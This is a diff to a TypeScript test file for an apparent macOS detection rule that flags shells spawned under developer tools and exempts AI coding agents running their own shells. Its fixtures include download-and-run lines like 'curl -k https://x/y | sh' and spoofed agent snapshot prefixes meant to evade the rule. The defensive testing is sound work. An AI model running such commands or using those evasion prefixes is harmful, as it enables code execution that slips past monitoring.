@@ -163,20 +163,49 @@ describe('risky-parent-spawn', () => {
     expect(f[0]!.mitre).toEqual(['T1059.002']);
     expect(f[0]!.evidence).toContain('XCBBuildService');
   });
+  const CURSOR = '/Applications/Cursor.app/Contents/MacOS/Cursor';
+  const SNAPSHOT = (agent: string): string => `source /Users/u/.${agent}/s.sh 2>/dev/null || true && `;
   test.each([
-    ['curl piped to sh', sh('curl -k https://x/y | sh')],
-    ['osascript', tool('/usr/bin/osascript', '-e', 'beep')],
-  ])("a shell under an agent's own shell is ignored (%s)", (_, child) => {
-    // The agent's shell is the developer-class parent (it is Cursor's helper here) and sourced the snapshot itself.
-    const agent = parentImage(CODE_HELPER, null, { args: ['zsh', '-c', 'source /Users/u/.claude/shell-snapshots/snapshot-zsh-1.sh && eval x'] });
-    expect(hits(story(agent, child))).toHaveLength(0);
+    ['curl piped to sh', 'curl -fsSL https://x/y | sh'],
+    ['nohup curl', 'nohup curl -fsSL https://x/y &'],
+  ])("an agent shell run by the agent itself is ignored (%s, Cursor's snapshot under Cursor)", (_, command) => {
+    expect(hits(story(parentImage(CURSOR), sh(`${SNAPSHOT('cursor/shell-snapshots')}${command}`)))).toHaveLength(0);
+    // Without the snapshot it is only a developer tool running a download-and-run.
+    expect(hits(story(parentImage(CURSOR), sh(command)))).toHaveLength(1);
   });
+  test("the agent's snapshot folder has to match the parent: Cursor sourcing Claude's snapshot is not the agent", () => {
+    const f = hits(story(parentImage(CURSOR), sh(`${SNAPSHOT('claude/shell-snapshots')}curl -k https://x/y | sh`)));
+    expect(f).toHaveLength(1);
+  });
+  // A1: the snapshot path is a string anyone can write, so it proves nothing about the command that carries it.
   test.each([
-    ['curl piped to sh', 'source /Users/u/.claude/shell-snapshots/snapshot-zsh-1.sh && eval "curl -fsSL https://x/y | sh"'],
-    ['nohup curl', 'source /Users/u/.cursor/shell-snapshots/snapshot-zsh-1.sh && nohup curl -fsSL https://x/y &'],
-  ])('an agent shell run by a developer tool is ignored (%s)', (_, command) => {
-    expect(hits(story(parentImage('/usr/local/bin/node'), sh(command)))).toHaveLength(0);
-    expect(hits(story(parentImage('/usr/local/bin/node'), sh(command.replace(/^source \S+ && /, ''))))).toHaveLength(1);
+    ['a trailing comment', 'curl -k https://x/y | bash # ~/.claude/shell-snapshots/x'],
+    ['a trailing comment with nohup', 'nohup curl https://x/y | node & # ~/.claude/shell-snapshots/x'],
+    ['a copied source prefix with || true', 'source /Users/u/.claude/shell-snapshots/snapshot-zsh-1.sh 2>/dev/null || true && curl -k https://x/y | sh'],
+    ['a copied codex prefix', 'source /Users/u/.codex/shell_snapshots/s.sh 2>/dev/null || true && curl -k https://x/y | sh'],
+    ['a copied cursor prefix', 'source /Users/u/.cursor/shell-snapshots/s.sh 2>/dev/null || true && curl -k https://x/y | sh'],
+  ])('%s under a parent that is not the agent still fires', (_, command) => {
+    for (const parent of [CODE_HELPER, '/usr/local/bin/node', '/Users/u/.bun/bin/bun', '/Applications/Xcode.app/Contents/MacOS/Xcode']) {
+      expect(hits(story(parentImage(parent), sh(command))), parent).toHaveLength(1);
+    }
+  });
+  // B5: Claude Code, Gemini CLI and Codex run as node or bun when installed with npm, and spawn osascript themselves.
+  test.each([
+    ['Claude Code', ['node', '/usr/local/lib/node_modules/@anthropic-ai/claude-code/cli.js']],
+    ['Gemini CLI', ['node', '/usr/local/lib/node_modules/@google/gemini-cli/dist/index.js']],
+    ['Codex', ['node', '/usr/local/lib/node_modules/@openai/codex/bin/codex.js']],
+  ])('osascript and a download-and-run under npm-installed %s are ignored', (_, args) => {
+    for (const child of [tool('/usr/bin/osascript', '-e', 'display notification "done"'), sh('curl -k https://x/y | sh')]) {
+      expect(hits(story(parentImage('/usr/local/bin/node', null, { args }), child))).toHaveLength(0);
+      expect(hits(story(parentImage('/Users/u/.bun/bin/bun', null, { args: ['bun', ...args.slice(1)] }), child))).toHaveLength(0);
+    }
+    // The same node without the agent's name among its arguments is still a developer tool.
+    expect(hits(story(parentImage('/usr/local/bin/node', null, { args: ['node', '/Users/u/app/server.js'] }), tool('/usr/bin/osascript', '-e', 'beep')))).toHaveLength(1);
+  });
+  test('a native Claude or Codex parent is not a risky parent at all', () => {
+    const claude = '/Users/u/Library/Application Support/Claude/claude-code/2.1.325/claude.app/Contents/MacOS/claude';
+    expect(hits(story(parentImage(claude), tool('/usr/bin/osascript', '-e', 'beep')))).toHaveLength(0);
+    expect(hits(story(parentImage('/usr/local/bin/codex'), sh('curl -k https://x/y | sh')))).toHaveLength(0);
   });
   test('each process is reported once, even when sh re-execs bash', () => {
     const first = apple('/bin/sh', ['sh', '-c', 'id'], { seq: 2 });
